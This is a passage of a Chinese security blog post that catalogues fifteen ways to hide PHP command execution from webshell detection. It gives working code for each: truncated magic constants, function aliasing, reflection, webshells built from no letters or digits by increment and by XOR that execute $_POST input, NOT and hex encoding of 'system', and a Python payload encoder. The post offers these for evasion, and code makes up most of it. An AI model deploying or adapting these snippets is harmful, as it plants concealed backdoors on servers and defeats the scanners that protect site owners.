+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><h6 id="框架免杀" class="heading-element"><span>0.0.0.1.11  框架免杀</span>
+  <a href="#%e6%a1%86%e6%9e%b6%e5%85%8d%e6%9d%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><h6 id="php文件内容免杀" class="heading-element"><span>0.0.0.1.12  php文件内容免杀</span>
+  <a href="#php%e6%96%87%e4%bb%b6%e5%86%85%e5%ae%b9%e5%85%8d%e6%9d%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p><a href="https://fushuling.com/index.php/2024/07/01/dedecms%e5%90%8e%e5%8f%b0rce%e7%9a%84%e4%b8%80%e4%ba%9b%e6%96%b9%e6%b3%95/"target="_blank" rel="external nofollow noopener noreferrer">https://fushuling.com/index.php/2024/07/01/dedecms%e5%90%8e%e5%8f%b0rce%e7%9a%84%e4%b8%80%e4%ba%9b%e6%96%b9%e6%b3%95/</a></p>
+<p>看这一篇文章感觉好玩的挺多的，可以作为对内容的免杀和绕过记一下</p>
+<p>####### 1.截断函数名</p>
+<pre tabindex="0"><code>&lt;?php 
+function systema(){
+    substr(__FUNCTION__, -7,-1)(&#34;whoami&#34;);
+}
+systema();</code></pre><p>####### 2.截断方法名</p>
+<pre tabindex="0"><code>&lt;?php 
+class test{
+    function systema(){
+        substr(__METHOD__, -7,-1)(&#34;whoami&#34;);
+    }
+}
+$a = new test();
+$a-&gt;systema();</code></pre><p>####### 3.截取文件名</p>
+<p>需命名为想要执行的函数</p>
+<pre tabindex="0"><code>&lt;?php
+substr(__FILE__, -10,-4)(&#39;whoami&#39;);
+?&gt;</code></pre><p>####### 4.mbereg_replace</p>
+<p>作用类似于<code>preg_replace</code>，支持传入e模式的正则表达式，不过这个别名在PHP7.3被移除了，只能在7.2及以下使用</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408061747485.webp" alt="image-20240806174727326" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408061747485.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408061747485.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408061747485.webp?size=large 2x" data-title="image-20240806174727326" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>####### 5.函数重命名</p>
+<pre tabindex="0"><code>&lt;?php
+use function system as test;
+
+test(&#39;whoami&#39;);</code></pre><p>####### 6.类的继承</p>
+<pre tabindex="0"><code>&lt;?php
+class test extends ReflectionFunction {}
+$f = new test(&#39;system&#39;);
+$f-&gt;invoke(&#39;whoami&#39;);</code></pre><p>####### 7.include_once</p>
+<p>只ban了include没ban include_once，我们可以上传个图片上去然后包含他</p>
+<p>####### 8.require_once</p>
+<p>同上</p>
+<p>####### 9.匿名类</p>
+<pre tabindex="0"><code>&lt;?php
+$f = new class(&#39;system&#39;) extends ReflectionFunction {};
+$f-&gt;invoke(&#39;whoami&#39;);</code></pre><p>####### 10.自增实现的无字母数字webshell</p>
+<pre tabindex="0"><code>&lt;?php $_=((_/_).$_)[0]; //同上，取NAN的第一个字母N
+$_++; //O
+$__=$_.$_++; //这里进行了++的，所以$_等于P, $__=PO
+$_++; // Q
+$_++; // R
+$_++; // S
+$_=_.$__.$_.++$_; //这里也进行了++的，所以最后一位是T, $_ = _POST
+$$_[_]($$_[____]);</code></pre><p>####### 11.字符拼接</p>
+<p>用上面那个无字母数字RCE的时候，我发现他这个好像压根不用那么复杂，直接字符拼接都能RCE。。。</p>
+<pre tabindex="0"><code>&lt;?php 
+$a = &#39;_POST&#39;;
+$$a[1]($$a[0]);</code></pre><p>####### 12.异或实现的无字母数字webshell</p>
+<pre tabindex="0"><code>&lt;?php
+$__=(&#34;#&#34;^&#34;|&#34;);$__.=(&#34;.&#34;^&#34;~&#34;);$__.=(&#34;/&#34;^&#34;`&#34;);$__.=(&#34;|&#34;^&#34;/&#34;);$__.=(&#34;{&#34;^&#34;/&#34;);$$__[_]($$__[__]);</code></pre><p>####### 13.取反</p>
+<p>生成器：</p>
+<pre tabindex="0"><code>&lt;?php
+$ans1=&#39;system&#39;;//函数名
+$ans2=&#39;whoami&#39;;//命令
+$data1=(&#39;~&#39;.&#39;urldecode(&#39;.&#39;\&#39;&#39;.urlencode(~$ans1).&#39;\&#39;&#39;);//通过两次取反运算得到system
+$data2=(&#39;~&#39;.&#39;urldecode(&#39;.&#39;\&#39;&#39;.urlencode(~$ans2).&#39;\&#39;&#39;);//通过两次取反运算得到dir
+echo (&#39;(&#39;.$data1.&#39;))&#39;.&#39;(&#39;.$data2.&#39;))&#39;.&#39;;&#39;);
+#####(~urldecode(&#39;%8C%86%8C%8B%9A%92&#39;))(~urldecode(&#39;%88%97%90%9E%92%96&#39;));</code></pre><p>####### 14.转hex</p>
+<pre tabindex="0"><code>def hex_payload(payload):
+    res_payload = &#39;&#39;
+    for i in payload:
+        hex_representation = &#34;\\x&#34; + hex(ord(i))[2:]  # Double backslashes to escape `\x`
+        res_payload += hex_representation
+    return res_payload
+
+if __name__ == &#34;__main__&#34;:
+    payload = &#34;system&#34;  # Assign the payload directly
+    converted_payload = hex_payload(payload)
+    print(&#34;[+] &#39;{}&#39; converted to hex: &#39;{}&#39;&#34;.format(payload, converted_payload))
+#####[+] &#39;system&#39; converted to hex: &#39;\x73\x79\x73\x74\x65\x6d&#39;
+&lt;?php echo&#34;\x73\x79\x73\x74\x65\x6d&#34;(&#34;whoami&#34;);</code></pre><p>####### 15.getenv</p>
+<pre tabindex="0"><code>&lt;?php
+getenv(&#39;HTTP_E&#39;)(&#39;whoami&#39;);</code></pre><p>getenv会获取请求头中<code>E</code>的值然后拼接执行函数</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%94%BB%E9%98%B2/" class="post-tag" title="Tags - 攻防">攻防</a><a href="/tags/%E5%85%8D%E6%9D%80/" class="post-tag" title="Tags - 免杀">免杀</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/25/" class="post-nav-item" rel="prev" title="Php 危险函数"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Php 危险函数</a>
+      <a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/%E6%9C%A8%E9%A9%AC%E5%BC%80%E5%8F%91/4/" class="post-nav-item" rel="next" title="Php Webshell">Php Webshell<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
